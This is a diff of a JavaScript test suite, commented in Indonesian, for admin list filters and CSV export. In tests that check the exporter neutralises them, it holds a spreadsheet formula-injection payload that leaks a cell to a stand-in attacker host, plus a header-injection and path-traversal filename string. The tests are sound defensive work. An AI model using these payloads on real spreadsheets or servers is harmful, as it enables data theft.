@@ -10603,6 +10603,15 @@ describe('UI mati dan UI yang berbohong dibuang', () => {
     const kodeKotak = kodeSajaAny(
       path.join(__dirname, '..', 'src', 'components', 'admin', 'KotakCari.tsx')
     );
+    // Klausa `where`-nya sendiri kini di `src/lib/saringan-daftar.ts`, dipakai
+    // BERSAMA route ekspor CSV: ekspor yang menyusun klausanya sendiri
+    // menghasilkan berkas yang terbuka sempurna dan memuat himpunan baris yang
+    // berbeda dari layar — tanpa satu pun tanda, pada berkas yang dipakai untuk
+    // rekonsiliasi uang. Jadi assertion yang mengikat BENTUK klausa dibaca dari
+    // sana, dan yang mengikat PEMAKAIANNYA tetap dibaca dari halamannya.
+    const kodeSaringan = kodeSajaAny(
+      path.join(__dirname, '..', 'src', 'lib', 'saringan-daftar.ts')
+    );
 
     it('kotak yang membuang ketikan tidak kembali', () => {
       // Cacat asli butir 5.19, persis. Ia tetap dijaga di sini.
@@ -10619,7 +10628,16 @@ describe('UI mati dan UI yang berbohong dibuang', () => {
 
     it('kata kunci sampai ke `where` Prisma, dengan AND ke saringan tab', () => {
       assert.match(kodeHalaman, /const kataKunci = bacaKataKunci\(/);
-      assert.match(kodeHalaman, /whereClause\.OR = \[/);
+      // Tab dan kata kunci masuk ke SATU fungsi, jadi tab tidak bisa hilang dari
+      // klausa tanpa mengubah tanda tangannya — dan route ekspor memanggil
+      // fungsi yang sama, sehingga berkasnya tidak bisa menyimpang dari layar.
+      assert.match(kodeHalaman, /whereBooking\(filterStatus, kataKunci\)/);
+      assert.match(kodeSaringan, /where\.OR = \[/);
+      // `status` dan `OR` berdampingan di objek yang sama; Prisma meng-AND
+      // properti sekerabat. Tanpa baris ini pencarian di tab "Refund"
+      // memunculkan pesanan dari tab lain, dan admin membacanya sebagai hasil
+      // pencarian di dalam tab itu.
+      assert.match(kodeSaringan, /if \(status !== undefined\) where\.status = status;/);
       // `count` memakai `where` yang sama, kalau tidak header menulis jumlah
       // seluruh tabel di atas hasil pencarian.
       assert.match(kodeHalaman, /count\(\{ where: whereClause \}\)/);
@@ -10634,17 +10652,25 @@ describe('UI mati dan UI yang berbohong dibuang', () => {
       // `mode: insensitive` wajib: yang dibaca operator huruf besar, cuid di
       // database huruf kecil. Tanpanya, nomor yang dibacakan lewat telepon tidak
       // pernah cocok dengan apa pun.
-      assert.match(kodeHalaman, /id: \{ endsWith: nomor, mode: Prisma\.QueryMode\.insensitive \}/);
-      assert.doesNotMatch(kodeHalaman, /id: \{ contains:/);
-      assert.match(kodeHalaman, /PANJANG_NOMOR_PESANAN/);
+      assert.match(kodeSaringan, /id: \{ endsWith: nomor, mode: Prisma\.QueryMode\.insensitive \}/);
+      assert.doesNotMatch(kodeSaringan, /id: \{ contains:/);
+      assert.match(kodeSaringan, /PANJANG_NOMOR_PESANAN/);
     });
 
     it('nomor WhatsApp dicari apa adanya, tidak dinormalkan lebih dulu', () => {
       // Kolomnya menyimpan bentuk `628…`, tapi yang dipakai `contains` — yaitu
       // potongan tengah nomor. Menormalkan `0812` menjadi `62812` justru membuat
       // potongan yang diketik admin tidak cocok dengan apa pun.
-      assert.match(kodeHalaman, /whatsapp: \{ contains: kataKunci/);
-      assert.doesNotMatch(kodeHalaman, /normalisasiNomorLokal\(kataKunci\)/);
+      assert.match(kodeSaringan, /whatsapp: memuat\(kataKunci\)/);
+      // `memuat` adalah bentuk `contains` + `insensitive` yang dipakai setiap
+      // kolom teks di modul itu. Isinya diikat di sini juga: diganti menjadi
+      // `equals`, keempat kolom berhenti ditemukan lewat potongan kata sekaligus
+      // tanpa satu pun test gagal.
+      assert.match(
+        kodeSaringan,
+        /return \{ contains: kataKunci, mode: Prisma\.QueryMode\.insensitive \};/
+      );
+      assert.doesNotMatch(kodeSaringan, /normalisasiNomorLokal\(kataKunci\)/);
     });
 
     it('hasil kosong karena pencarian dibedakan dari belum ada pesanan', () => {
@@ -27145,6 +27171,16 @@ describe('saringan & urutan daftar admin', () => {
     return path.join(__dirname, '..', 'src', 'app', 'admin', '(dashboard)', ...bagian);
   }
 
+  // Peta urut dan klausa `where` keempat daftar kini di satu modul, dipakai
+  // BERSAMA route ekspor CSV. Itu bukan kerapian: ekspor yang menyusun klausa
+  // dan urutannya sendiri menghasilkan berkas yang terbuka sempurna dengan
+  // himpunan — atau urutan — baris yang berbeda dari layar, dan berkas itu
+  // dipakai untuk rekonsiliasi. Yang dibandingkan admin antara berkas dan layar
+  // adalah baris ke-n, jadi urutan yang berbeda pun sudah salah.
+  const kodeSaringan = kodeSajaAny(
+    path.join(__dirname, '..', 'src', 'lib', 'saringan-daftar.ts')
+  );
+
   describe('bacaPilihan() — daftar tertutup, bukan teks URL', () => {
     const PILIHAN = ['terbaru', 'terlama', 'harga-naik'];
 
@@ -27323,34 +27359,55 @@ describe('saringan & urutan daftar admin', () => {
     // dengan aturan yang sama, karena yang dijaga bukan kolomnya melainkan
     // bentuknya: peta tertutup, dan satu-satunya jalan masuk lewat `bacaPilihan`.
     const HALAMAN_URUT = [
-      { nama: 'billboards', jalur: jalurDaftar('billboards', 'page.tsx'), tipe: 'Billboard' },
-      { nama: 'users', jalur: jalurDaftar('users', 'page.tsx'), tipe: 'User' },
+      {
+        nama: 'billboards',
+        jalur: jalurDaftar('billboards', 'page.tsx'),
+        tipe: 'Billboard',
+        peta: 'URUT_BILLBOARD',
+      },
+      {
+        nama: 'users',
+        jalur: jalurDaftar('users', 'page.tsx'),
+        tipe: 'User',
+        peta: 'URUT_USER',
+      },
     ];
 
-    for (const { nama, jalur, tipe } of HALAMAN_URUT) {
+    for (const { nama, jalur, tipe, peta } of HALAMAN_URUT) {
       describe(nama, () => {
         const kode = kodeSajaAny(jalur);
+        const kunci = 'KUNCI_' + peta;
 
         it('peta urut tertutup dan bertipe orderBy Prisma', () => {
+          // Petanya di `saringan-daftar.ts`, bukan di halamannya: route ekspor
+          // harus mengurutkan dengan cara yang SAMA, dan dua peta yang kebetulan
+          // sedang mirip adalah dua peta yang akan menyimpang.
           assert.match(
-            kode,
+            kodeSaringan,
             new RegExp(
-              'const URUT: Record<string, Prisma\\.' + tipe + 'OrderByWithRelationInput> = \\{',
+              'export const ' + peta + ': Record<string, Prisma\\.' + tipe +
+                'OrderByWithRelationInput> = \\{',
             ),
           );
         });
 
         it('kunci yang sah diambil dari peta itu, bukan dikarang di tempat lain', () => {
-          assert.match(kode, /const KUNCI_URUT = Object\.keys\(URUT\)/);
-          assert.match(kode, /bacaPilihan\(paramsQuery\?\.urut, KUNCI_URUT, 'terbaru'\)/);
+          assert.match(
+            kodeSaringan,
+            new RegExp('export const ' + kunci + ' = Object\\.keys\\(' + peta + '\\)'),
+          );
+          assert.match(
+            kode,
+            new RegExp('bacaPilihan\\(paramsQuery\\?\\.urut, ' + kunci + ", 'terbaru'\\)"),
+          );
         });
 
         it('orderBy dibaca dari peta, tidak pernah dari parameter', () => {
-          // Nilainya selalu `URUT[urutAktif]`. Letaknya boleh berbeda: di
+          // Nilainya selalu `URUT_…[urutAktif]`. Letaknya boleh berbeda: di
           // `billboards` peta itu diserahkan sebagai ARGUMEN ke fungsi pengambil,
           // yang menuliskan `orderBy,` singkat di dalam query. Yang dijaga asal
           // nilainya, bukan letak propertinya.
-          assert.match(kode, /URUT\[urutAktif\]/);
+          assert.match(kode, new RegExp(peta + '\\[urutAktif\\]'));
           // Tiga bentuk yang MELOLOSKAN nama kolom dari URL ke Prisma.
           assert.doesNotMatch(kode, /orderBy: \{ \[/);
           assert.doesNotMatch(kode, /orderBy: \[?\s*paramsQuery/);
@@ -27361,10 +27418,11 @@ describe('saringan & urutan daftar admin', () => {
           // Nama kunci di URL sengaja tidak sama dengan nama kolom, supaya skema
           // tabel tidak ikut tertulis di bilah alamat. Dan kalaupun seseorang
           // menambah kunci baru, ia tidak boleh menyentuh kolom rahasia.
-          const mulai = kode.indexOf('const URUT');
-          const peta = kode.slice(mulai, kode.indexOf('};', mulai));
+          const mulai = kodeSaringan.indexOf('export const ' + peta);
+          assert.ok(mulai > 0, 'peta ' + peta + ' tidak ditemukan');
+          const isi = kodeSaringan.slice(mulai, kodeSaringan.indexOf('};', mulai));
           for (const rahasia of ['password', 'ktp', 'npwp', 'emailVerified']) {
-            assert.ok(!peta.includes(rahasia), 'kunci urut menyentuh ' + rahasia);
+            assert.ok(!isi.includes(rahasia), 'kunci urut ' + nama + ' menyentuh ' + rahasia);
           }
         });
       });
@@ -27375,10 +27433,9 @@ describe('saringan & urutan daftar admin', () => {
       // layar. Yang bocor adalah URUTANNYA: `?urut=password` mengurutkan baris
       // menurut hash bcrypt, dan itu membocorkan perbandingan antar nilai yang
       // tidak pernah boleh terbaca. Jadi yang harus menolak adalah petanya.
-      const kode = kodeSajaAny(jalurDaftar('users', 'page.tsx'));
-      const mulai = kode.indexOf('const URUT');
-      const kunci = kode
-        .slice(mulai, kode.indexOf('};', mulai))
+      const mulai = kodeSaringan.indexOf('export const URUT_USER');
+      const kunci = kodeSaringan
+        .slice(mulai, kodeSaringan.indexOf('};', mulai))
         .split('\n')
         .map((baris) => baris.match(/^\s*'?([a-zA-Z-]+)'?:/))
         .filter(Boolean)
@@ -27391,14 +27448,17 @@ describe('saringan & urutan daftar admin', () => {
   });
 
   describe('keempat daftar punya kotak cari yang menyaring di database', () => {
+    // `fungsi`: nama fungsi `where` daftar ini di `src/lib/saringan-daftar.ts`.
+    // Klausanya diperiksa di sana, karena di sanalah ia sekarang ditulis — satu
+    // salinan, dipakai halaman DAN route ekspornya.
     const DAFTAR = [
-      { nama: 'billboards', jalur: jalurDaftar('billboards', 'page.tsx'), basis: '/admin/billboards' },
-      { nama: 'orders', jalur: jalurDaftar('orders', 'page.tsx'), basis: '/admin/orders' },
-      { nama: 'users', jalur: jalurDaftar('users', 'UserClientPage.tsx'), basis: '/admin/users' },
-      { nama: 'pengajuan', jalur: jalurDaftar('pengajuan', 'page.tsx'), basis: '/admin/pengajuan' },
+      { nama: 'billboards', jalur: jalurDaftar('billboards', 'page.tsx'), basis: '/admin/billboards', fungsi: 'whereBillboard' },
+      { nama: 'orders', jalur: jalurDaftar('orders', 'page.tsx'), basis: '/admin/orders', fungsi: 'whereBooking' },
+      { nama: 'users', jalur: jalurDaftar('users', 'UserClientPage.tsx'), basis: '/admin/users', fungsi: 'whereUser' },
+      { nama: 'pengajuan', jalur: jalurDaftar('pengajuan', 'page.tsx'), basis: '/admin/pengajuan', fungsi: 'wherePengajuan' },
     ];
 
-    for (const { nama, jalur, basis } of DAFTAR) {
+    for (const { nama, jalur, basis, fungsi } of DAFTAR) {
       describe(nama, () => {
         const kodeHalaman = kodeSajaAny(jalurDaftar(nama, 'page.tsx'));
         const kodeKotak = kodeSajaAny(jalur);
@@ -27419,13 +27479,26 @@ describe('saringan & urutan daftar admin', () => {
           // Tanpa `insensitive`, "budi" tidak menemukan "Budi" — dan admin
           // menyimpulkan pelanggannya belum pernah terdaftar.
           //
-          // Diperiksa per klausa, bukan sekali per berkas: halaman users mencari
+          // Diperiksa per klausa, bukan sekali per berkas: daftar users mencari
           // empat kolom, jadi `mode` yang hilang dari SATU kolom tetap
           // meninggalkan tiga yang membuat pemeriksaan tingkat berkas lulus —
           // sementara kolom yang kehilangannya berhenti ditemukan sama sekali.
-          const klausa = kodeHalaman.match(/\{ contains: (?:kataKunci|nomor|kata)[^}]*\}/g) ?? [];
-          assert.ok(klausa.length > 0, 'tidak satu pun kolom dicari dengan contains');
-          for (const k of klausa) {
+          //
+          // Bentuk `contains` + `insensitive`-nya kini satu fungsi (`memuat`),
+          // jadi yang diikat ada dua: fungsi itu benar-benar membawa
+          // `insensitive`, DAN setiap kolom teks yang dicari lewat fungsi itu.
+          // Satu klausa yang ditulis ulang menjadi `{ contains: kataKunci }`
+          // hanya lolos pemeriksaan pertama.
+          assert.match(
+            kodeSaringan,
+            /return \{ contains: kataKunci, mode: Prisma\.QueryMode\.insensitive \};/
+          );
+          const mulai = kodeSaringan.indexOf('export function ' + fungsi + '(');
+          assert.ok(mulai > 0, 'fungsi ' + fungsi + ' tidak ditemukan');
+          const badan = kodeSaringan.slice(mulai, kodeSaringan.indexOf('\n}', mulai));
+          const lewatMemuat = badan.match(/[a-zA-Z]+: memuat\(kataKunci\)/g) ?? [];
+          assert.ok(lewatMemuat.length > 0, 'tidak satu pun kolom dicari lewat memuat di ' + fungsi);
+          for (const k of badan.match(/\{ contains:[^}]*\}/g) ?? []) {
             assert.match(k, /mode: Prisma\.QueryMode\.insensitive/, k);
           }
         });
@@ -27472,10 +27545,9 @@ describe('saringan & urutan daftar admin', () => {
       // Prisma, tapi yang dituntut di sini bentuk EKSPLISIT-nya: ia tidak bisa
       // disalahbaca pembaca berikutnya sebagai "status ATAU salah satu kata
       // kunci" — dan pembacaan itulah yang menghasilkan mutasi satu kata ini.
-      const kode = kodeSajaAny(jalurDaftar('pengajuan', 'page.tsx'));
-      const mulai = kode.indexOf('const where: Prisma.PengajuanTitikWhereInput');
+      const mulai = kodeSaringan.indexOf('export function wherePengajuan(');
       assert.ok(mulai > 0, 'klausa where pengajuan tidak ditemukan');
-      const blok = kode.slice(mulai, kode.indexOf('\n  const ', mulai + 10));
+      const blok = kodeSaringan.slice(mulai, kodeSaringan.indexOf('\n}', mulai));
       assert.match(blok, /AND: \[\s*\n\s*saringanStatus,/);
       assert.doesNotMatch(blok, /OR: \[\s*\n\s*saringanStatus,/);
       // Kata kuncinya tetap OR antar KOLOM — itu memang yang dimaksud: satu kata
@@ -27542,3 +27614,1018 @@ describe('saringan & urutan daftar admin', () => {
     }
   });
 });
+
+// ===========================================================================
+// Butir 5.21 — unduhan CSV keempat daftar admin
+//
+// Berkas ekspor punya satu sifat yang tidak dimiliki halaman: ia KELUAR dari
+// aplikasi ini. Begitu tersimpan di laptop atau terkirim lewat surel, tidak ada
+// gerbang peran, tidak ada masa sesi, dan tidak ada cara menariknya kembali.
+// Karena itu yang diikat di bawah bukan hanya "berkasnya terbentuk", melainkan
+// empat hal yang masing-masing pernah menjadi cacat nyata di sistem lain:
+//
+//  1. SELNYA TIDAK BISA DIBACA SALAH. Alamat bertanda koma, nama perusahaan
+//     bertanda kutip, dan catatan berbaris ganda adalah isi yang PALING sering
+//     ada di tabel-tabel ini — dan ketiganya membuat penyusun CSV naif
+//     menghasilkan berkas yang TERBUKA dengan sempurna dengan nominal di kolom
+//     tanggal.
+//  2. SELNYA TIDAK DIEKSEKUSI. Nilai yang dimulai `=`, `+`, `-`, `@` dijalankan
+//     sebagai rumus oleh Excel/LibreOffice/Sheets, dan kolom yang diekspor di
+//     sini sebagian besar diisi PEMBELI. Tidak satu pun header HTTP bisa
+//     menahannya; hanya penyusun CSV-nya.
+//  3. BARISNYA SAMA DENGAN LAYAR. `where` dan `orderBy` wajib datang dari
+//     `@/lib/saringan-daftar`, modul yang sama yang dipanggil keempat halaman.
+//     Salinan yang menyimpang tidak menghasilkan galat — ia menghasilkan berkas
+//     rekonsiliasi yang isinya bukan yang diminta.
+//  4. GERBANGNYA DIPUTUSKAN ULANG PER DAFTAR, lebih sempit daripada pintu panel.
+// ===========================================================================
+describe('ekspor CSV daftar admin (butir 5.21)', () => {
+  const { Prisma, PaymentStatus, PaymentTujuan } = require('@prisma/client');
+
+  const JALUR_CSV = path.join(__dirname, '..', 'src', 'lib', 'csv.ts');
+  const JALUR_ROUTE_EKSPOR = path.join(
+    __dirname, '..', 'src', 'app', 'api', 'admin', 'ekspor', 'route.ts'
+  );
+  const JALUR_TOMBOL_EKSPOR = path.join(
+    __dirname, '..', 'src', 'components', 'admin', 'TombolEkspor.tsx'
+  );
+  const JALUR_SARINGAN = path.join(__dirname, '..', 'src', 'lib', 'saringan-daftar.ts');
+  const JALUR_GERBANG = path.join(__dirname, '..', 'src', 'lib', 'gerbang-peran.ts');
+
+  const { BOM_UTF8, berisikoRumus, headerCsv, keCsv, namaBerkasCsv, sel } = require(JALUR_CSV);
+  const saringan = require(JALUR_SARINGAN);
+  const gerbang = require(JALUR_GERBANG);
+
+  const jalurHalaman = (...bagian) =>
+    path.join(__dirname, '..', 'src', 'app', 'admin', '(dashboard)', ...bagian);
+
+  const kodeRoute = kodeSajaAny(JALUR_ROUTE_EKSPOR);
+  const kodeTombol = kodeSajaAny(JALUR_TOMBOL_EKSPOR);
+
+  /**
+   * Pembaca CSV kecil sesuai RFC 4180, khusus untuk test ini.
+   *
+   * Sengaja TIDAK memakai `isi.split(',')`: yang diperiksa di bawah justru
+   * nilai-nilai yang memuat koma, kutip, dan baris baru — jadi pemisah naif akan
+   * membuat test ini lulus atas berkas yang rusak dengan cara yang sama seperti
+   * yang sedang dijaga. Dan ia memberi satu hal yang tidak bisa didapat dari
+   * pencocokan teks: JUMLAH SEL per baris, sehingga header yang bergeser satu
+   * kolom terhadap barisnya tertangkap.
+   */
+  function bacaCsv(isi) {
+    const teks = isi.startsWith(BOM_UTF8) ? isi.slice(1) : isi;
+    const baris = [];
+    let barisIni = [];
+    let nilai = '';
+    let dalamKutip = false;
+
+    for (let i = 0; i < teks.length; i += 1) {
+      const c = teks[i];
+
+      if (dalamKutip) {
+        if (c === '"') {
+          if (teks[i + 1] === '"') {
+            nilai += '"';
+            i += 1;
+          } else {
+            dalamKutip = false;
+          }
+        } else {
+          nilai += c;
+        }
+        continue;
+      }
+
+      if (c === '"') {
+        dalamKutip = true;
+        continue;
+      }
+      if (c === ',') {
+        barisIni.push(nilai);
+        nilai = '';
+        continue;
+      }
+      if (c === '\r' && teks[i + 1] === '\n') {
+        barisIni.push(nilai);
+        baris.push(barisIni);
+        barisIni = [];
+        nilai = '';
+        i += 1;
+        continue;
+      }
+      nilai += c;
+    }
+
+    if (nilai !== '' || barisIni.length > 0) {
+      barisIni.push(nilai);
+      baris.push(barisIni);
+    }
+    return baris;
+  }
+
+  // ----------------------------------------------------------------- penyusun
+  describe('penyusun CSV: sel yang tidak bisa dibaca salah', () => {
+    it('null dan undefined menjadi sel kosong, bukan tulisan "null"', () => {
+      // Tulisan `null` di tengah kolom alamat terbaca sebagai data oleh orang
+      // yang membacanya, dan sebagai teks oleh spreadsheet yang menjumlahkannya.
+      assert.equal(sel(null), '');
+      assert.equal(sel(undefined), '');
+    });
+
+    it('angka nol TETAP tertulis, tidak ikut jatuh menjadi kosong', () => {
+      // Cacat klasik `if (!nilai) return ''`. Di berkas ini nol adalah jawaban
+      // yang berarti: "tambahan dibayar: 0" berbeda dari "tambahan dibayar:
+      // (kosong)" — yang kedua terbaca sebagai data yang hilang.
+      assert.equal(sel(0), '0');
+      assert.equal(sel(false), 'false');
+    });
+
+    it('koma di dalam nilai dikutip, sehingga kolom di kanannya tidak bergeser', () => {
+      // "Jl. Sudirman No. 5, Jakarta" tanpa kutip memecah satu kolom menjadi dua
+      // dan menggeser SELURUH kolom di kanannya satu langkah. Nominal lalu
+      // terbaca di kolom tanggal, dan spreadsheet tidak mengeluh sama sekali.
+      assert.equal(sel('Jl. Sudirman No. 5, Jakarta'), '"Jl. Sudirman No. 5, Jakarta"');
+    });
+
+    it('kutip di dalam nilai digandakan, tidak menutup pembatas kolom', () => {
+      assert.equal(sel('PT "Maju" Jaya'), '"PT ""Maju"" Jaya"');
+    });
+
+    it('baris baru di dalam nilai dikutip, tidak memecah satu baris menjadi dua', () => {
+      assert.equal(sel('catatan\nlanjutan'), '"catatan\nlanjutan"');
+      assert.equal(sel('catatan\r\nlanjutan'), '"catatan\r\nlanjutan"');
+    });
+
+    it('nilai biasa TIDAK dikutip', () => {
+      // Berkas yang mengutip setiap sel tetap sah, tapi jauh lebih sulit dibaca
+      // saat seseorang membuka CSV-nya dengan editor teks mencari satu baris.
+      assert.equal(sel('Budi Santoso'), 'Budi Santoso');
+      assert.equal(sel(15000000), '15000000');
+    });
+  });
+
+  describe('injeksi rumus spreadsheet', () => {
+    it('keempat pembuka rumus beserta tab dan CR dikenali berisiko', () => {
+      for (const c of ['=', '+', '-', '@', '\t', '\r']) {
+        assert.equal(berisikoRumus(c + 'apa pun'), true, JSON.stringify(c));
+      }
+    });
+
+    it('teks kosong dan nilai biasa tidak dianggap berisiko', () => {
+      for (const t of ['', 'Budi', '6281234', '0', 'a=b', ' =SUM(A1)']) {
+        assert.equal(berisikoRumus(t), false, JSON.stringify(t));
+      }
+    });
+
+    it('=HYPERLINK yang diketik pembeli dinetralkan dan tetap dikutip', () => {
+      // Pembeli mendaftar dengan nama perusahaan berisi rumus; setiap admin yang
+      // membuka ekspornya melihat tautan yang tampak wajar di tengah tabel
+      // internal, dan satu klik mengirim isi sel tetangganya ke server pihak
+      // ketiga. Tab pembuka membuat sel itu berhenti dianggap rumus.
+      const jahat = '=HYPERLINK("https://jahat.example/?d="&A1,"Klik untuk detail")';
+      const hasil = sel(jahat);
+
+      assert.ok(hasil.startsWith('"\t='), hasil);
+      assert.ok(hasil.endsWith('"'), hasil);
+      // Dinetralkan, BUKAN dipotong: nilai aslinya masih utuh di dalam sel, dan
+      // pembacanya masih bisa melihat apa yang diketik pembeli.
+      assert.equal(bacaCsv(keCsv([[jahat]]))[0][0], '\t' + jahat);
+    });
+
+    it('nomor telepon +62 dan nominal negatif tetap UTUH, tidak dibuang', () => {
+      // Ini bagian yang paling mudah salah: menghapus atau mengganti karakter
+      // pembukanya memang menghentikan rumus, tapi `+6281…` menjadi `6281…`
+      // adalah nomor yang tidak bisa dihubungi, dan `-50000` yang berubah
+      // adalah angka yang tidak bisa dijumlahkan. Keamanan dan kebenaran data
+      // dua-duanya bisa didapat di sini, jadi mengorbankan satu tidak diterima.
+      for (const nilai of ['+6281234567890', '-50000', '@budi', '=1']) {
+        const kembali = bacaCsv(keCsv([[nilai]]))[0][0];
+        assert.equal(kembali, '\t' + nilai, nilai);
+        assert.ok(kembali.includes(nilai), nilai);
+      }
+    });
+
+    it('rumus yang juga memuat kutip tetap digandakan kutipnya', () => {
+      // Dua aturan berlaku bersamaan pada satu sel. Yang menerapkan salah satu
+      // saja menghasilkan berkas rusak (pembatas tertutup di tengah nilai) atau
+      // berkas yang mengeksekusi rumus.
+      assert.equal(sel('=A1&"x"'), '"\t=A1&""x"""');
+      assert.equal(bacaCsv(keCsv([['=A1&"x"']]))[0][0], '\t=A1&"x"');
+    });
+  });
+
+  describe('bentuk berkas: BOM dan CRLF', () => {
+    it('berkas dimulai BOM UTF-8', () => {
+      // Tanpa BOM, Excel di Windows membaca CSV sebagai windows-1252 dan setiap
+      // nama beraksen terbaca sebagai karakter acak — lalu admin menyimpulkan
+      // datanya rusak di database.
+      assert.ok(keCsv([['a']]).startsWith('﻿'));
+      assert.equal(BOM_UTF8, '﻿');
+    });
+
+    it('baris dipisah CRLF dan berkas diakhiri CRLF', () => {
+      assert.equal(keCsv([['a'], ['b']]), '﻿a\r\nb\r\n');
+    });
+
+    it('judul kolom lewat jalur yang sama dengan barisnya', () => {
+      // Judul kolom pun bisa memuat koma, dan tidak ada alasan menuliskannya
+      // lewat jalur kedua yang bisa menyimpang.
+      assert.equal(bacaCsv(keCsv([['Harga, Rp'], ['1']]))[0][0], 'Harga, Rp');
+    });
+  });
+
+  describe('nama berkas unduhan', () => {
+    it('tanggal WAJIB ikut di nama berkas', () => {
+      // Admin mengekspor daftar yang sama berulang kali untuk membandingkan dua
+      // titik waktu. Tiga berkas `pengguna.csv`, `pengguna (1).csv`,
+      // `pengguna (2).csv` di folder Unduhan tidak bisa dibedakan lagi setelah
+      // lima menit.
+      assert.equal(
+        namaBerkasCsv('pengguna', new Date('2026-09-29T10:00:00.000Z')),
+        'pengguna-2026-09-29.csv'
+      );
+    });
+
+    it('tanggalnya hari WIB, bukan hari UTC', () => {
+      // Instan di bawah SENGAJA dipilih di ambang: 30 September 23.00 UTC adalah
+      // 1 Oktober 06.00 WIB. Pengikat yang memakai tengah hari akan lulus atas
+      // kedua rumus sekaligus — dan itu justru bentuk pengikat yang membuat cacat
+      // ini bisa masuk tanpa terlihat.
+      //
+      // Akibat rumus UTC bukan sekadar nama yang salah sehari: ia paling sering
+      // terjadi di batas BULAN, tempat berkasnya dijumlahkan, sehingga ekspor
+      // Oktober bernama September dan ditumpuk ke rekonsiliasi bulan yang salah.
+      assert.equal(
+        namaBerkasCsv('pengguna', new Date('2026-09-30T23:00:00.000Z')),
+        'pengguna-2026-10-01.csv'
+      );
+      // Ambang sebaliknya: 1 Oktober 16.59 UTC masih 1 Oktober 23.59 WIB.
+      assert.equal(
+        namaBerkasCsv('pengguna', new Date('2026-10-01T16:59:00.000Z')),
+        'pengguna-2026-10-01.csv'
+      );
+    });
+
+    it('karakter yang bisa menyuntik header Content-Disposition dibuang', () => {
+      // Nama berkas masuk ke `Content-Disposition`. Nilai yang memuat baris baru
+      // di sana adalah injeksi header, dan menahannya di tempat namanya dibuat
+      // lebih murah daripada memercayai setiap pemanggil yang akan datang.
+      const nama = namaBerkasCsv('a"\r\nX-Jahat: 1/../..\\etc', new Date('2026-01-02T00:00:00.000Z'));
+      for (const c of ['"', '\r', '\n', '/', '\\', ' ', ':', '.']) {
+        assert.equal(nama.slice(0, nama.length - 4).includes(c), false, c);
+      }
+      assert.ok(nama.endsWith('.csv'), nama);
+    });
+
+    it('awalan yang habis tersaring tidak menghasilkan nama kosong', () => {
+      assert.equal(namaBerkasCsv('///', new Date('2026-01-02T00:00:00.000Z')), 'ekspor-2026-01-02.csv');
+    });
+  });
+
+  describe('header respons unduhan', () => {
+    const h = headerCsv('pengguna-2026-09-29.csv');
+
+    it('tipe dan encoding ditulis eksplisit walau sudah ada BOM', () => {
+      assert.equal(h['Content-Type'], 'text/csv; charset=utf-8');
+    });
+
+    it('dilampirkan sebagai berkas, bukan dirender di tab', () => {
+      assert.equal(h['Content-Disposition'], 'attachment; filename="pengguna-2026-09-29.csv"');
+    });
+
+    it('tidak boleh disimpan cache bersama', () => {
+      // Isinya data pelanggan. Proxy bersama atau cache peramban yang
+      // menyimpannya membuat ekspor satu admin disajikan kepada orang
+      // berikutnya yang membuka URL yang sama.
+      assert.equal(h['Cache-Control'], 'no-store');
+    });
+  });
+
+  // -------------------------------------------------------------------- route
+  function buatPrisma(data = {}) {
+    const panggilan = [];
+
+    const balas = (nama, baku) => async (args = {}) => {
+      panggilan.push({ nama, args });
+      const nilai = Object.hasOwn(data, nama) ? data[nama] : baku;
+      return typeof nilai === 'function' ? nilai(args) : nilai;
+    };
+
+    return {
+      panggilan,
+      argumen: (nama) => panggilan.filter((p) => p.nama === nama).map((p) => p.args),
+      prisma: {
+        billboard: { findMany: balas('billboard.findMany', []) },
+        booking: {
+          findMany: balas('booking.findMany', []),
+          groupBy: balas('booking.groupBy', []),
+        },
+        user: { findMany: balas('user.findMany', []) },
+        payment: { findMany: balas('payment.findMany', []) },
+        pengajuanTitik: { findMany: balas('pengajuanTitik.findMany', []) },
+      },
+    };
+  }
+
+  function buatRouteEkspor(db, peran = 'ADMIN') {
+    // `NextResponse` di route ini dipakai DUA cara: `NextResponse.json(...)`
+    // untuk penolakan, dan `new NextResponse(isi, { headers })` untuk berkasnya.
+    // Palsu yang hanya menyediakan `.json` akan melempar tepat di jalur yang
+    // paling perlu diuji.
+    class NextResponsePalsu extends Response {}
+    NextResponsePalsu.json = (isi, init = {}) => new Response(JSON.stringify(isi), init);
+
+    return muatDenganModulPalsu(JALUR_ROUTE_EKSPOR, {
+      'next/server': { NextResponse: NextResponsePalsu },
+      'next-auth': {
+        getServerSession: async () =>
+          peran === null ? null : { user: { id: 'admin-1', role: peran } },
+      },
+      '@/lib/auth': { authOptions: {} },
+      '@/lib/prisma': { prisma: db.prisma },
+    });
+  }
+
+  const mintaEkspor = (kueri) =>
+    new Request('https://contoh.test/api/admin/ekspor' + kueri);
+
+  const BATAS = buatRouteEkspor(buatPrisma()).BATAS_BARIS_EKSPOR;
+
+  describe('gerbang: sesi lebih dulu, lalu nama daftar, lalu peran', () => {
+    it('tanpa sesi dijawab 401 TANPA menyebut daftar mana yang ada', () => {
+      // Urutan sebaliknya menjawab 400 "daftar tidak dikenal" kepada orang yang
+      // belum masuk — yaitu memberi tahu nama daftar mana yang ada kepada pihak
+      // yang belum berhak mengetahui bahwa route ini pun ada.
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db, null);
+
+      return route.GET(mintaEkspor('?daftar=users')).then(async (res) => {
+        assert.equal(res.status, 401);
+        const isi = await res.text();
+        for (const nama of ['billboards', 'orders', 'users', 'pengajuan']) {
+          assert.equal(isi.includes(nama), false, nama);
+        }
+        assert.equal(db.panggilan.length, 0);
+      });
+    });
+
+    it('nama daftar yang salah tulis DITOLAK, tidak jatuh ke ekspor baku', async () => {
+      // Ini alasan `bacaPilihan` sengaja tidak dipakai untuk parameter ini:
+      // nilai bakunya akan menyerahkan berkas `billboards` kepada siapa pun yang
+      // salah menulis nama daftar — berkas yang tidak diminta, tanpa satu pun
+      // tanda bahwa yang diminta tidak ada.
+      for (const kueri of ['', '?daftar=', '?daftar=billboard', '?daftar=USERS', '?daftar=__proto__', '?daftar=user']) {
+        const db = buatPrisma();
+        const route = buatRouteEkspor(db, 'SUPER_ADMIN');
+        const res = await route.GET(mintaEkspor(kueri));
+
+        assert.equal(res.status, 400, kueri);
+        assert.equal(db.panggilan.length, 0, kueri);
+      }
+    });
+
+    it('peran yang sudah masuk tapi tidak berizin dijawab 403, bukan 401', async () => {
+      // 401 membuat klien menyimpulkan sesinya kedaluwarsa lalu menyuruh orangnya
+      // masuk ulang untuk mendapat jawaban yang sama.
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db, 'CS');
+      const res = await route.GET(mintaEkspor('?daftar=users'));
+
+      assert.equal(res.status, 403);
+      assert.equal(db.panggilan.length, 0);
+    });
+
